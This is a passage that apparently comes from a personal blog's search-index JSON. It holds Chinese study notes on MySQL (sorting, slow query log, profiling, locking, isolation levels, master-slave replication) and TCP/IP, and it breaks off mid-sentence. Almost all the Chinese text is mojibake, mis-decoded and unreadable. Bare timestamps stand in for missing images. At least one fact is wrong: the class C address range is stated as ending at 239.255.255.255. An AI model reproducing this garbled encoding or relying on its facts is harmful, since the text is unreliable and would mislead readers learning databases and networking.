å–ä¸€æ‰¹æ•°æ®ï¼Œè¦ä»ç£ç›˜è¿›è¡Œäº†ä¸¤æ¬¡æ‰«æï¼Œä¼—æ‰€å‘¨çŸ¥ï¼ŒI\\Oæ˜¯å¾ˆè€—æ—¶çš„ï¼Œæ‰€ä»¥åœ¨mysql4.1ä¹‹åï¼Œå‡ºç°äº†ç¬¬äºŒç§æ”¹è¿›çš„ç®—æ³•ï¼Œå°±æ˜¯å•è·¯æ’åºã€‚ å•è·¯æ’åºï¼šä»ç£ç›˜è¯»å–æŸ¥è¯¢éœ€è¦çš„æ‰€æœ‰åˆ—ï¼ŒæŒ‰ç…§order byåˆ—åœ¨bufferå¯¹å®ƒä»¬è¿›è¡Œæ’åºï¼Œç„¶åæ‰«ææ’åºåçš„åˆ—è¡¨è¿›è¡Œè¾“å‡ºï¼Œå®ƒçš„æ•ˆç‡æ›´å¿«ä¸€äº›ï¼Œé¿å…äº†ç¬¬äºŒæ¬¡è¯»å–æ•°æ®ã€‚å¹¶ä¸”æŠŠéšæœºIOå˜æˆäº†é¡ºåºIOï¼Œä½†æ˜¯å®ƒä¼šä½¿ç”¨æ›´å¤šçš„ç©ºé—´ã€‚å› ä¸ºå®ƒæŠŠæ¯ä¸€è¡Œéƒ½ä¿å­˜åœ¨å†…å­˜äº†ã€‚ å•è·¯æ˜¯åå‡ºçš„ï¼Œæ€»ä½“è€Œè¨€å¥½è¿‡åŒè·¯ã€‚ å•è·¯ä¹Ÿæœ‰é—®é¢˜ï¼š ä¼˜åŒ–ç­–ç•¥ å¢å¤§sort_buffer_sizeå‚æ•°çš„è®¾ç½® å¢å¤§max_length_for_sort_dataå‚æ•°çš„è®¾ç½® 1596184507560 1596184598926 æ€»ç»“:1596184599055 group byå…³é”®å­—ä¼˜åŒ–1596184960579 æ…¢æŸ¥è¯¢æ—¥å¿—1596185094308 1596188504073 æŸ¥çœ‹æ˜¯å¦å¼€å¯ SHOW VARIABLES LIKE &#39;%slow_query_log%&#39;; é»˜è®¤æ˜¯å…³é—­çš„ å¼€å¯ set global slow_query_log=1; 1596188752818 1596189293802 1596189329303 å¼€å¯äº†æ…¢æŸ¥è¯¢æ—¥å¿—å,ä»€ä¹ˆæ ·çš„SQLæ‰ä¼šè®°å½•åˆ°æ…¢æŸ¥è¯¢æ—¥å¿—é‡Œé¢å‘¢? 1596189519955 è®¾ç½®æ…¢çš„é˜ˆå€¼æ—¶é—´: set global long_query_time=3; ##éœ€è¦é‡æ–°è¿æ¥æˆ–æ–°å¼€ä¸€ä¸ªä¼šè¯æ‰èƒ½çœ‹åˆ°ä¿®æ”¹å€¼. SHOW VARIABLES LIKE &#39;long_query_time%&#39;; ##æˆ–è€…ä½¿ç”¨ SHOW global VARIABLES LIKE &#39;long_query_time&#39;; æ¨¡æ‹Ÿ select sleep(4); æŸ¥çœ‹æ—¥å¿— cat /var/lib/mysql/***.log 1596190235561 æŸ¥è¯¢å½“å‰ç³»ç»Ÿä¸­æœ‰å¤šå°‘æ¡æ…¢æŸ¥è¯¢è®°å½• 1596196732744 é…ç½®æ–‡ä»¶ 1596196765703 æ—¥å¿—åˆ†æå·¥å…·åœ¨ç”Ÿäº§ç¯å¢ƒä¸­,å¦‚æœè¦æ‰‹å·¥åˆ†ææ—¥å¿—,æŸ¥æ‰¾ã€åˆ†æSQL,æ˜¾ç„¶æ˜¯ä¸ªä½“åŠ›æ´»,MYSQLæä¾›äº†æ—¥å¿—åˆ†æå·¥å…·mysqldumpslow. ä½¿ç”¨å¸®åŠ© mysqldumpslow --help 1596197041821 å¸¸ç”¨å‚è€ƒ: 1596197129161 æ‰¹é‡æ’å…¥æ•°æ®è„šæœ¬1596197341176 å»ºæ•°æ®åº“ create database bigData; use bigData; å»ºè¡¨dept CREATE TABLE dept( id INT UNSIGNED PRIMARY KEY AUTO_INCREMENT, ##éƒ¨é—¨ç¼–å· deptno MEDIUMINT UNSIGNED NOT NULL DEFAULT 0, ##éƒ¨é—¨åç§° dname VARCHAR(20) NOT NULL DEFAULT &quot;&quot;, ##æ¥¼å±‚ loc VARCHAR(13) NOT NULL DEFAULT &quot;&quot; )ENGINE = INNODB DEFAULT CHARSET=GBK; å»ºè¡¨emp 1596197755173 è®¾ç½®å‚æ•°log_bin_trust_function_creators 1596197943115 éšæœºäº§ç”Ÿéƒ¨é—¨å­—ç¬¦ä¸² 1596203524363 1596203855006 åˆ›å»ºå­˜å‚¨è¿‡ç¨‹ åˆ›å»ºå¾€empè¡¨æ’å…¥æ•°æ®çš„å­˜å‚¨è¿‡ç¨‹function:æœ‰è¿”å›å€¼ procedure:æ— è¿”å›å€¼ 1596204083288 åˆ›å»ºå¾€deptè¡¨æ’å…¥æ•°æ®çš„å­˜å‚¨è¿‡ç¨‹1596204389262 è°ƒç”¨å­˜å‚¨è¿‡ç¨‹ dept 1596204532873 emp 1596205863651 Show Profile æ˜¯mysqlæä¾›å¯ä»¥ç”¨æ¥åˆ†æå½“å‰ä¼šè¯ä¸­è¯­å¥æ‰§è¡Œçš„èµ„æºæ¶ˆè€—æƒ…å†µ.å¯ä»¥ç”¨äºSQlçš„è°ƒä¼˜çš„æµ‹é‡. é»˜è®¤æƒ…å†µä¸‹,å‚æ•°å¤„äºå…³é—­çŠ¶æ€,å¹¶ä¿å­˜æœ€è¿‘15æ¬¡çš„è¿è¡Œç»“æœ. çœ‹çœ‹å½“å‰çš„mysqlç‰ˆæœ¬æ˜¯å¦æ”¯æŒ Show variables like &#39;profiling&#39;; æˆ–è€…Show variables like &#39;profiling%&#39;; ##é»˜è®¤æ˜¯å…³é—­çš„,ä½¿ç”¨å‰éœ€è¦å¼€å¯ 1596277672469 å¼€å¯åŠŸèƒ½ 1596277717456 è¿è¡ŒSQL select * from emp group by id%10 limit 150000; select * from emp group by id%20 order by 5; æŸ¥çœ‹ç»“æœ show profiles; 1596278164535 è¯Šæ–­SQL show profile cpu, block io for query ID(ä¸Šä¸€æ­¥å‰é¢çš„é—®é¢˜SQLæ•°å­—å·ç ); 1596281249332 éœ€è¦æ³¨æ„çš„: 1596281293913 å…¨å±€æŸ¥è¯¢æ—¥å¿—æ°¸è¿œä¸è¦åœ¨ç”Ÿäº§ç¯å¢ƒå¼€å¯è¿™ä¸ªåŠŸèƒ½,ä»…åœ¨æµ‹è¯•ç¯å¢ƒä½¿ç”¨.é…ç½®å¼€å¯: 1596283157110 ç¼–ç å¼€å¯: 1596283183562 æ•°æ®åº“é”é”æ˜¯è®¡ç®—æœºåè°ƒå¤šä¸ªè¿›ç¨‹æˆ–çº¿ç¨‹å¹¶å‘è®¿é—®æŸä¸€èµ„æºçš„æœºåˆ¶.åœ¨æ•°æ®åº“ä¸­,é™¤ä¼ ç»Ÿçš„è®¡ç®—èµ„æº(å¦‚CPU,RAM,I/Oç­‰)çš„äº‰ç”¨ä»¥å¤–,æ•°æ®ä¹Ÿæ˜¯ä¾›è®¸å¤šç”¨æˆ·å…±äº«çš„èµ„æº.å¦‚ä½•ä¿è¯æ•°æ®å¹¶å‘è®¿é—®çš„ä¸€è‡´æ€§ã€æœ‰æ•ˆæ€§hiæ‰€æœ‰æ•°æ®åº“å¿…é¡»è§£å†³çš„ä¸€ä¸ªé—®é¢˜ï¼Œé”å†²çªä¹Ÿæ˜¯å½±å“æ•°æ®åº“å¹¶å‘è®¿é—®çš„ä¸€ä¸ªé‡è¦å› ç´ ã€‚ä»è¿™ä¸ªè§’åº¦æ¥è¯´ï¼Œé”å¯¹æ•°æ®åº“è€Œè¨€æ˜¾å¾—å°¤å…¶é‡è¦ï¼Œä¹Ÿæ›´åŠ å¤æ‚ã€‚ é”çš„åˆ†ç±»ä»å¯¹æ•°æ®æ“ä½œçš„ç±»å‹(è¯»\\å†™)åˆ† è¯»é”(å…±äº«é”): é’ˆå¯¹åŒä¸€ä»½æ•°æ®,å¤šä¸ªè¯»æ“ä½œå¯ä»¥åŒæ—¶è¿›è¡Œè€Œä¸ä¼šäº’ç›¸å½±å“ å†™é”(æ’ä»–é”): å½“å‰å†™æ“ä½œæ²¡æœ‰å®Œæˆå‰,å®ƒä¼šé˜»æ–­å…¶ä»–å†™é”å’Œè¯»é”; ä»å¯¹æ•°æ®æ“ä½œçš„ç²’åº¦åˆ† è¡¨é” è¡Œé” MYSQLé”æœºåˆ¶ä¸‰é” â†“è¡¨é”(åè¯»)ç‰¹ç‚¹:åå‘MyISAMå­˜å‚¨å¼•æ“,å¼€é”€å°,åŠ é”å¿«;æ— æ­»é”;é”å®šç²’åº¦å¤§,å‘ç”Ÿé”å†²çªçš„æ¦‚ç‡æœ€é«˜,å¹¶å‘åº¦æœ€ä½ æ¡ˆä¾‹: 1596287138753 1596287239538 1596287470060 1596287910808 è¯»æ“ä½œæ—¶å…±äº«çš„,ä¼šè¯1å’Œ2éƒ½å¯ä»¥è¯»mylock; ä¼šè¯1ä¸èƒ½æ›´æ–°è¡¨; ä¼šè¯1åªèƒ½è¯»åŠ è¯»é”çš„mylockè¡¨,ä¸èƒ½è¯»å…¶ä»–è¡¨(book);ä¼šè¯2å¯ä»¥è¯»å…¶ä»–è¡¨. ä¼šè¯2å¦‚æœè¦æ›´æ–°è¡¨,ä¼šå½¢æˆé˜»å¡,è¦ç­‰å¾…é”çš„é‡Šæ”¾(unlock tables) 1596288189317 1596288256700 1596288286059 å†™é”1596293163830 1596293452648 1596293310415 å…¶ä»–ä¼šè¯è¯»è¢«é”çš„è¡¨ä¼šé˜»å¡; ç»“è®º: ç®€è€Œè¨€ä¹‹,å°±æ˜¯è¯»é”ä¼šé˜»å¡å†™,ä½†æ˜¯ä¸ä¼šå µå¡è¯»,è€Œå†™é”åˆ™ä¼šæŠŠè¯»å’Œå†™éƒ½å µå¡. çœ‹çœ‹å“ªäº›è¡¨è¢«é”äº†show open tables; å¦‚ä½•åˆ†æè¡¨é”å®š1596294625538 1596294765205 è¡Œé”(åå†™)ç‰¹ç‚¹ï¼šåå‘InnoDBå­˜å‚¨å¼•æ“ï¼Œå¼€é”€å¤§ï¼ŒåŠ é”æ…¢ï¼›ä¼šå‡ºç°æ­»é”ï¼›é”å®šç²’åº¦æœ€å°ï¼Œå‘ç”Ÿé”å†²çªçš„æ¦‚ç‡æœ€ä½ï¼Œå¹¶å‘åº¦ä¹Ÿæœ€é«˜ã€‚ InnoDBä¸MyISAMçš„æœ€å¤§ä¸åŒä¹Ÿæœ‰ä¸¤ç‚¹ï¼š ä¸€æ˜¯æ”¯æŒäº‹åŠ¡(TRANSACTION); äºŒæ˜¯é‡‡ç”¨äº†è¡Œçº§é”. äº‹åŠ¡(Transaction)åŠå…¶ACIDå±æ€§1596361613254 å¹¶å‘å¤„ç†äº‹åŠ¡å¸¦æ¥çš„é—®é¢˜ æ›´æ–°ä¸¢å¤±(Lost Update) 1596361800362 è„è¯»(Dirty Reads) 1596361853689 ä¸å¯é‡å¤è¯»(Non-Repeatable Reads) 1596361887110 å¹»è¯»(Planttom Reads) 1596361949063 äº‹åŠ¡éš”ç¦»çº§åˆ«;1596362019625 é»˜è®¤çº§åˆ«æ˜¯Repeatable read æ¡ˆä¾‹åˆ†æ:å»ºè¡¨ 1596362218502 select * from test_innodb_lock; 1596362340762 åœ¨æ²¡session1å’Œ2æäº¤commitä¹‹å‰,session-2è¯»ä¸åˆ°ä¿®æ”¹çš„æ•°æ®. 1596362749535 æ“ä½œä¸åŒè¡Œ,ä¸ä¼šé˜»å¡ 1596363091362 æ— ç´¢å¼•è¡Œé”å˜è¡¨é”;ç±»å‹è½¬æ¢,ç´¢å¼•å¤±æ•ˆ: (b=â€™4000â€™) 1596364172827 è¡Œé”å˜è¡¨é”,é€ æˆé˜»å¡. é—´éš™é”çš„å±å®³1596367264611 session2ä¼šé˜»å¡, 1596367511520 1596367327059 1596367354502 å¦‚ä½•é”å®šä¸€è¡Œ1596367801141 è¡Œé”æ€»ç»“ 1596368151351 å¦‚ä½•åˆ†æè¡Œé”å®š1596368219445 1596368336057 1596368378801 ä¼˜åŒ–å»ºè®®: 1596368467316 é¡µé”å¼€é”€å’ŒåŠ é”æ—¶é—´ç•Œäºè¡¨é”å’Œè¡Œé”ä¹‹é—´,ä¼šå‡ºç°æ­»é”;é”å®šç²’åº¦ç•Œäºè¡¨é”å’Œè¡Œé”ä¹‹é—´,å¹¶å‘åº¦ä¸€èˆ¬. ä¸»ä»å¤åˆ¶å¤åˆ¶çš„åŸºæœ¬åŸç†ï¼š slaveä¼šä»masterè¯»å–binlogæ¥è¿›è¡Œæ•°æ®åŒæ­¥ 1596372268011 å¤åˆ¶çš„åŸºæœ¬åŸåˆ™ï¼š æ¯ä¸ªslaveåªæœ‰ä¸€ä¸ªmaster æ¯ä¸ªslaveåªèƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„æœåŠ¡å™¨ID æ¯ä¸ªmasterå¯ä»¥æœ‰å¤šä¸ªslave å¤åˆ¶çš„æœ€å¤§é—®é¢˜ï¼šå»¶æ—¶ ä¸€ä¸»ä¸€ä»å¸¸è§é…ç½®ï¼š mysqlç‰ˆæœ¬è¦ä¸€è‡´ä¸”åå°ä»¥æœåŠ¡è¿è¡Œ. ç½‘æ®µè¦ç›¸é€šping ä¸»ä»éƒ½é…ç½®åœ¨[mysqld]ç»“ç‚¹ä¸‹,éƒ½æ˜¯å°å†™. ä¸»æœº(window)ä¿®æ”¹my.inié…ç½®æ–‡ä»¶ ä¸»æœåŠ¡å™¨å”¯ä¸€ID[å¿…é¡»] server-id = 1 å¯åŠ¨äºŒè¿›åˆ¶æ—¥å¿—[å¿…é¡»] log-bin=è‡ªå·±æœ¬åœ°çš„è·¯å¾„/mysqlbin log-bin=D:/devSoft/MySQLServer5.5/data/mysqlbin å¯ç”¨é”™è¯¯æ—¥å¿—[å¯é€‰] log-err = è‡ªå·±æœ¬åœ°çš„è·¯å¾„/mysqlerr log-err = D:/devSoft/MySQLServer5.5/data/mysqlerr æ ¹ç›®å½•[å¯é€‰] basedir = â€œè‡ªå·±æœ¬åœ°è·¯å¾„â€ basedir = â€œD:/devSoft/MySQLServer5.5/â€œ ä¸´æ—¶ç›®å½•[å¯é€‰] tmpdir = â€œè‡ªå·±æœ¬åœ°è·¯å¾„â€ tmpdir = â€œD:/devSoft/MySQLServer5.5/â€œ æ•°æ®ç›®å½•[å¯é€‰] datadir = â€œè‡ªå·±æœ¬åœ°è·¯å¾„/Data/â€œ datadir = â€œD:/devSoft/MySQLServer5.5/Data/â€œ read-only=0 ä¸»æœº, è¯»å†™éƒ½å¯ä»¥ è®¾ç½®ä¸è¦å¤åˆ¶çš„æ•°æ®åº“[å¯é€‰] binlog-ignore-db=mysql è®¾ç½®éœ€è¦å¤åˆ¶çš„æ•°æ®åº“[å¯é€‰] binlog-do-db=éœ€è¦å¤åˆ¶çš„ä¸»æ•°æ®åº“åå­— ä»æœº(Linux)ä¿®æ”¹my.cnfé…ç½®æ–‡ä»¶ ä»æœåŠ¡å™¨å”¯ä¸€ID[å¿…é¡»] æ³¨é‡Š server-id=1 ä¸‹ç¿»,å–æ¶ˆæ³¨é‡Šserver-id = 2 å¯åŠ¨äºŒè¿›åˆ¶æ—¥å¿—[å¯é€‰] å› ä¿®æ”¹è¿‡é…ç½®æ–‡ä»¶,è¯·ä¸»æœº+ä»æœºéƒ½é‡å¯åå°mysqlæœåŠ¡ service mysql stop service mysql start ps -ef|grep mysql ä¸»æœºä»æœºéƒ½å…³é—­é˜²ç«å¢™ window æ‰‹åŠ¨å…³é—­ linuxä»æœº service iptables stop åœ¨windowä¸»æœºä¸Šå»ºç«‹è´¦æˆ·å¹¶æˆæƒslave mysql 1596381866992 flush privileges æŸ¥çœ‹masterçš„çŠ¶æ€ show master status; è®°å½•ä¸‹Fileå’ŒPositionçš„å€¼. Positionåœ¨åé¢ä½¿ç”¨åä¼šæœ‰å˜åŒ– åœ¨linuxä»æœºä¸Šé…ç½®éœ€è¦å¤åˆ¶çš„ä¸»æœº 1596382399568 1596382484275 å¯åŠ¨ä»æœåŠ¡å™¨å¤åˆ¶åŠŸèƒ½ start slave; show slave status\\G ä¸‹é¢ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯Yes,åˆ™è¯´æ˜ä¸»ä»é…ç½®æˆåŠŸ. Slave_IO_Running:Yes Slave_SQL_Running:Yes ä¸»æœºå»ºåº“,å»ºè¡¨ insertè®°å½• ä»æœºæœ‰è®°å½• åœæ­¢ä»æœºå¤åˆ¶åŠŸèƒ½ stop slave;","categories":[],"tags":[{"name":"sql","slug":"sql","permalink":"https://blog.kayleh.top/tags/sql/"}]},{"title":"HTTP","slug":"HTTP","date":"2020-07-26T18:58:34.000Z","updated":"2021-04-11T17:11:28.151Z","comments":true,"path":"HTTP/","link":"","permalink":"https://blog.kayleh.top/HTTP/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"TCP/IP","slug":"TCP-IP","date":"2020-07-26T18:58:27.000Z","updated":"2021-04-11T17:11:28.460Z","comments":true,"path":"TCP-IP/","link":"","permalink":"https://blog.kayleh.top/TCP-IP/","excerpt":"TCP/IPåè®®","text":"TCP/IPåè®® TCP/IPåè®®æ¨¡å‹(Transmission Control Protocol/Internet Protocol),åŒ…å«äº†ä¸€ç³»åˆ—æ„æˆäº’è”ç½‘åŸºç¡€çš„ç½‘ç»œåè®®ï¼Œæ˜¯Internetçš„æ ¸å¿ƒåè®®ã€‚TCP/IPåè®®å‚è€ƒæ¨¡å‹ï¼š åˆ†ä¸ºå››ä¸ªå±‚æ¬¡ï¼šæ•°æ®é“¾è·¯å±‚ TCPIPåè®® æè¿° åº”ç”¨å±‚ HTTP FTP ä¼ è¾“å±‚ TCP UDP ç½‘ç»œå±‚ IPåè®®ï¼šè´Ÿè´£å¯¹æ•°æ®åŠ ä¸ŠIPåœ°å€å’Œå…¶ä»–çš„æ•°æ®ä»¥ç¡®å®šä¼ è¾“çš„ç›®æ ‡ æ•°æ®é“¾è·¯å±‚ ä¸ºå¾…ä¼ çš„æ•°æ®åŠ å…¥ä¸€ä¸ªä»¥å¤ªç½‘åè®®å¤´ï¼Œå¹¶è¿›è¡ŒCRCç¼–ç ï¼Œä¸ºæ•°æ®ä¼ è¾“åšå‡†å¤‡ TCP/IPåè®®é€šä¿¡è¿‡ç¨‹ï¼š å¯¹åº”ç€æ•°æ®å…¥æ ˆå’Œå‡ºæ ˆçš„è¿‡ç¨‹ã€‚å…¥æ ˆï¼šæ•°æ®å‘é€æ–¹æ¯å±‚ä¸æ–­çš„å°è£…é¦–éƒ¨å’Œå°¾éƒ¨ï¼Œæ·»åŠ ä¸€äº›ä¼ è¾“çš„ä¿¡æ¯ï¼Œç¡®ä¿èƒ½ä¼ è¾“åˆ°ç›®çš„åœ°ã€‚å‡ºæ ˆï¼šæ•°æ®æ¥æ”¶æ–¹æ¯å±‚ä¸æ–­åœ°æ‹†é™¤é¦–éƒ¨ä¸å°¾éƒ¨ï¼Œå¾—åˆ°æœ€ç»ˆä¼ è¾“çš„æ•°æ®ã€‚ æ•°æ®é“¾è·¯å±‚åŸç†ï¼šç‰©ç†å±‚è´Ÿè´£0,1æ¯”ç‰¹æµä¸ç‰©ç†è®¾å¤‡ç”µå‹é«˜ä½ã€å…‰çš„é—ªç­ä¹‹é—´çš„äº’æ¢ã€‚è¯¦è§£ï¼šæ•°æ®é“¾è·¯å±‚è´Ÿè´£å°†0,1åºåˆ—åˆ’åˆ†ä¸ºæ•°æ®å¸§ä»ä¸€ä¸ªèŠ‚ç‚¹ä¼ è¾“åˆ°ä¸´è¿‘çš„å¦ä¸€ä¸ªèŠ‚ç‚¹ï¼Œè¿™äº›èŠ‚ç‚¹æ˜¯é€šè¿‡MACæ¥å”¯ä¸€æ ‡è¯†çš„ã€‚åŠŸèƒ½ï¼š å°è£…æˆå¸§ï¼šæŠŠç½‘ç»œå±‚æ•°æ®æŠ¥åŠ å¤´å’Œå°¾ï¼Œå°è£…æˆå¸§ï¼Œå¸§å¤´ä¸­åŒ…æ‹¬æºMACåœ°å€å’Œç›®çš„MACåœ°å€ é€æ˜ä¼ è¾“ï¼šæŒ‡ä¸ç®¡æ‰€ä¼ æ•°æ®æ˜¯ä»€ä¹ˆæ ·çš„æ¯”ç‰¹ç»„åˆï¼Œéƒ½åº”å½“èƒ½å¤Ÿåœ¨é“¾è·¯ä¸Šä¼ é€ã€‚å½“æ‰€ä¼ æ•°æ®ä¸­çš„æ¯”ç‰¹ç»„åˆæ°å·§ä¸æŸä¸€ä¸ªæ§åˆ¶ä¿¡æ¯å®Œå…¨ä¸€æ ·æ—¶ï¼Œå°±å¿…é¡»é‡‡å–é€‚å½“çš„æªæ–½ï¼Œä½¿æ¥æ”¶æ–¹ä¸ä¼šå°†è¿™æ ·çš„æ•°æ®è¯¯è®¤ä¸ºæ˜¯æŸç§æ§åˆ¶ä¿¡æ¯ã€‚ å¯é ä¼ è¾“ï¼šé‡‡ç”¨ä¸€ç³»åˆ—æŠ€æœ¯æ¥ä¿éšœä¿¡æ¯åœ¨å‘é€æ–¹å’Œæ¥æ”¶æ–¹å‡†ç¡®ã€ç²¾ç¡®çš„ä¼ è¾“ã€‚åœ¨å‡ºé”™ç‡å¾ˆä½çš„é“¾è·¯ä¸Šå¾ˆå°‘ç”¨ï¼Œä½†æ˜¯æ— çº¿é“¾è·¯WLANä¼šä¿è¯å¯é ä¼ è¾“ å·®é”™æ£€æµ‹(CRC)ï¼š æ¥æ”¶è€…æ£€æµ‹é”™è¯¯ï¼Œå¦‚æœå‘ç°å·®é”™ï¼Œä¸¢å¼ƒè¯¥å¸§ã€‚ ç½‘ç»œå±‚IPåè®®ï¼šæ‰€æœ‰çš„TCPã€UDPã€IMCPã€IGMPçš„æ•°æ®éƒ½ä»¥IPæ•°æ®æ ¼å¼ä¼ è¾“ã€‚æ³¨æ„ï¼šIPæ˜¯ä¸å¯é åè®®ï¼Œå³ï¼ŒIPåè®®æ²¡æœ‰æä¾›ä¸€ç§æ•°æ®æœªä¼ è¾¾ä»¥åçš„å¤„ç†æœºåˆ¶ï¼Œè€Œæ˜¯è®©ä¸Šå±‚åè®®TCPæˆ–UDPå¤„ç†ã€‚ IPåœ°å€åˆ’åˆ†ï¼šæ•°æ®é“¾è·¯å±‚ä¸­æ˜¯é€šè¿‡MACåœ°å€è¯†åˆ«ä¸åŒèŠ‚ç‚¹ï¼Œåœ¨IPå±‚çš„åœ°å€æ ‡è¯†æ˜¯IPåœ°å€ã€‚ 32ä½IPåœ°å€ = ç½‘ç»œå· + åœ°å€ä½è¿™æ ·åˆ’åˆ†çš„ç›®çš„ï¼šå‡å°‘è·¯ç”±å™¨ä¸­è·¯ç”±è¡¨è®°å½•çš„æ•°ç›®ç½‘ç»œåœ°å€ï¼šå¯ä»¥é™å®šæ‹¥æœ‰ç›¸åŒç½‘ç»œåœ°å€çš„ç»ˆç«¯åœ¨åŒä¸€ä¸ªèŒƒå›´å†…ï¼Œè·¯ç”±å™¨åªéœ€è¦ç»´æŠ¤ä¸€æ¡è¿™ä¸ªç½‘ç»œåœ°å€çš„æ–¹å‘å°±å¯ä»¥æ‰¾åˆ°å…¶ç»ˆç«¯äº†ã€‚IPåˆ†ç±»ï¼š Aç±»IPåœ°å€ï¼š 0.0.0.0 ~ 127.255.255.255 Bç±»IPåœ°å€ï¼š 128.0.0.0 ~ 191.255.255.255 Cç±»IPåœ°å€ï¼š 192.0.0.0 ~ 239.255.255.255 Dç±»IPåœ°å€ï¼š IPæ•°æ®æŠ¥çš„å®Œæ•´æ ¼å¼ä¸€ä¸ªIPæ•°æ®æŠ¥æœ‰é¦–éƒ¨å’Œæ•°æ®ä¸¤éƒ¨åˆ†ç»„æˆã€‚é¦–éƒ¨å‰ä¸€éƒ¨åˆ†æ˜¯å›ºå®šé•¿åº¦ï¼Œ20å­—èŠ‚ï¼›å¯é€‰å­—æ®µçš„é•¿åº¦æ˜¯å¯å˜çš„ ARPåŠRARPåè®®ARPï¼šåœ°å€è§£æåè®®ï¼Œæ ¹æ®IPåœ°å€è·å–MACåœ°å€çš„ä¸€ç§åè®®ä¸»æœºæ˜¯ä¸çŸ¥é“è¿™ä¸ªipå¯¹åº”çš„æ˜¯å“ªä¸ªä¸»æœºçš„å“ªä¸ªæ¥å£ï¼Œå½“ä¸»æœºè¦å‘é€ä¸€ä¸ªIPåŒ…çš„æ—¶å€™ï¼Œä¼šé¦–å…ˆæŸ¥ä¸€ä¸‹è‡ªå·±çš„ARPé«˜é€Ÿç¼“å­˜(IP-MACåœ°å€å¯¹åº”è¡¨ç¼“å­˜)å¦‚æœæŸ¥è¯¢çš„IP-MACå€¼å¯¹ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆä¸»æœºå°±å‘ç½‘ç»œå‘é€ä¸€ä¸ªARPåè®®å¹¿æ’­åŒ…ï¼Œè¿™ä¸ªå¹¿æ’­åŒ…é‡Œé¢å°±æœ‰å¾…æŸ¥è¯¢çš„IPåœ°å€ï¼Œè€Œç›´æ¥æ”¶åˆ°è¿™ä»½å¹¿æ’­çš„åŒ…çš„æ‰€æœ‰ä¸»æœºéƒ½ä¼šæŸ¥è¯¢è‡ªå·±çš„IPåœ°å€ï¼Œå¦‚æœæ”¶åˆ°å¹¿æ’­åŒ…çš„æŸä¸€ä¸ªä¸»æœºå‘ç°è‡ªå·±ç¬¦åˆæ¡ä»¶ï¼Œé‚£ä¹ˆå°±å‡†å¤‡å¥½ä¸€ä¸ªåŒ…å«è‡ªå·±çš„MACåœ°å€çš„ARPåŒ…ä¼ é€ç»™å‘é€ARPå¹¿æ’­çš„ä¸»æœºã€‚ è€Œå¹¿æ’­ä¸»æœºæ‹¿åˆ°ARPåŒ…åä¼šæ›´æ–°è‡ªå·±çš„ARPç¼“å­˜ï¼ˆå°±æ˜¯å­˜æ”¾IP-MACå¯¹åº”è¡¨çš„åœ°æ–¹ï¼‰ã€‚å‘é€å¹¿æ’­çš„ä¸»æœºå°±ä¼šç”¨æ–°çš„ARPç¼“å­˜æ•°æ®å‡†å¤‡å¥½æ•°æ®é“¾è·¯å±‚çš„çš„æ•°æ®åŒ…å‘é€å·¥ä½œã€‚ RARPåè®®çš„å·¥ä½œä¸æ­¤ç›¸åï¼Œä¸åšèµ˜è¿°ã€‚ IPMPåè®®IPåè®®å¹¶ä¸æ˜¯ä¸€ä¸ªå¯é çš„åè®®ï¼Œå®ƒä¸ä¿è¯æ•°æ®è¢«é€è¾¾ï¼Œé‚£ä¹ˆï¼Œè‡ªç„¶çš„ï¼Œä¿è¯æ•°æ®é€è¾¾çš„å·¥ä½œåº”è¯¥ç”±å…¶ä»–çš„æ¨¡å—æ¥å®Œæˆã€‚å…¶ä¸­ä¸€ä¸ªé‡è¦çš„æ¨¡å—å°±æ˜¯ICMP(ç½‘ç»œæ§åˆ¶æŠ¥æ–‡)åè®®ã€‚ICMPä¸æ˜¯é«˜å±‚åè®®ï¼Œè€Œæ˜¯IPå±‚çš„åè®®ã€‚ å½“ä¼ é€IPæ•°æ®åŒ…å‘ç”Ÿé”™è¯¯ã€‚æ¯”å¦‚ä¸»æœºä¸å¯è¾¾ï¼Œè·¯ç”±ä¸å¯è¾¾ç­‰ç­‰ï¼ŒICMPåè®®å°†ä¼šæŠŠé”™è¯¯ä¿¡æ¯å°åŒ…ï¼Œç„¶åä¼ é€å›ç»™ä¸»æœºã€‚ç»™ä¸»æœºä¸€ä¸ªå¤„ç†é”™è¯¯çš„æœºä¼šï¼Œè¿™ ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆè¯´å»ºç«‹åœ¨IPå±‚ä»¥ä¸Šçš„åè®®æ˜¯å¯èƒ½åšåˆ°å®‰å…¨çš„åŸå› ã€‚ PINGpingå¯ä»¥è¯´æ˜¯ICMPçš„æœ€è‘—åçš„åº”ç”¨ï¼Œæ˜¯TCP/IPåè®®çš„ä¸€éƒ¨åˆ†ã€‚åˆ©ç”¨â€œpingâ€å‘½ä»¤å¯ä»¥æ£€æŸ¥ç½‘ç»œæ˜¯å¦è¿é€šï¼Œå¯ä»¥å¾ˆå¥½åœ°å¸®åŠ©æˆ‘ä»¬åˆ†æå’Œåˆ¤å®šç½‘ç»œæ•…éšœã€‚ TracerouteTracerouteæ˜¯ç”¨æ¥ä¾¦æµ‹ä¸»æœºåˆ°ç›®çš„ä¸»æœºä¹‹é—´æ‰€ç»è·¯ç”±æƒ…å†µçš„é‡è¦å·¥å…·ï¼Œä¹Ÿæ˜¯æœ€ä¾¿åˆ©çš„å·¥å…·ã€‚ Tracerouteçš„åŸç†æ˜¯éå¸¸éå¸¸çš„æœ‰æ„æ€ï¼Œå®ƒæ”¶åˆ°åˆ°ç›®çš„ä¸»æœºçš„IPåï¼Œé¦–å…ˆç»™ç›®çš„ä¸»æœºå‘é€ä¸€ä¸ªTTL=1çš„UDPæ•°æ®åŒ…ï¼Œè€Œç»è¿‡çš„ç¬¬ä¸€ä¸ªè·¯ç”±å™¨æ”¶åˆ°è¿™ä¸ªæ•°æ®åŒ…ä»¥åï¼Œå°±è‡ªåŠ¨æŠŠTTLå‡1ï¼Œè€ŒTTLå˜ä¸º0ä»¥åï¼Œè·¯ç”±å™¨å°±æŠŠè¿™ä¸ªåŒ…ç»™æŠ›å¼ƒäº†ï¼Œå¹¶åŒæ—¶äº§ç”Ÿ 